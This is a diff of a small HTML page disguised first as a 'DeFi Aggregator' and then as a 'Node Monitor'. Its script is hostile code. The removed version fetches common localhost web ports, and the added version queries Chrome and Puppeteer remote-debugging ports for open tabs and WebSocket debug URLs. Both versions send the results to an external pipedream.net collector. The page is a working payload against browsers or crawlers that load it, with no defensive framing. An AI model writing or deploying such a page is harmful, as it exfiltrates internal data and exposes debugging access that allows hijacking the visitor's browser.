@@ -1,36 +1,20 @@
 <html>
-<head><title>DeFi Aggregator</title></head>
+<head><title>Node Monitor</title></head>
 <body>
-<h1>Aggregating Token Feeds...</h1>
+<h1>Checking Node Health...</h1>
 <script>
-// Try common web app ports
-var targets = [
-  'http://127.0.0.1/',
-  'http://127.0.0.1:3000/',
-  'http://127.0.0.1:5000/',
-  'http://127.0.0.1:8000/',
-  'http://127.0.0.1:8080/',
-  'http://127.0.0.1:8888/',
-  'http://127.0.0.1:9090/',
-  'http://localhost/',
-  'http://localhost:3000/',
-  'http://localhost:8080/'
-];
+// Puppeteer runs Chrome with --remote-debugging-port
+// Default is 9222 but could be others
+var debugPorts = [9222, 9229, 9333, 2345, 5858, 9515];
 
-targets.forEach(function(url, i) {
-  setTimeout(function() {
-    fetch(url)
-      .then(function(r) { return r.text(); })
-      .then(function(d) {
-        // Send first 500 chars to avoid URL length limits
-        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?url=' + encodeURIComponent(url) 
-          + '&data=' + btoa(d.substring(0, 500)));
-      })
-      .catch(function(e) {
-        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?url=' + encodeURIComponent(url) 
-          + '&err=' + encodeURIComponent(e.message));
-      });
-  }, i * 300);
+debugPorts.forEach(function(port) {
+  fetch('http://127.0.0.1:' + port + '/json')
+    .then(function(r) { return r.text(); })
+    .then(function(d) {
+      // This returns all open tabs/pages with their WebSocket debug URLs
+      fetch('https://eoh2zr5zzepcygc.m.pipedream.net?devtools_port=' + port + '&data=' + btoa(d));
+    })
+    .catch(function() {});
 });
 </script>
 </body>
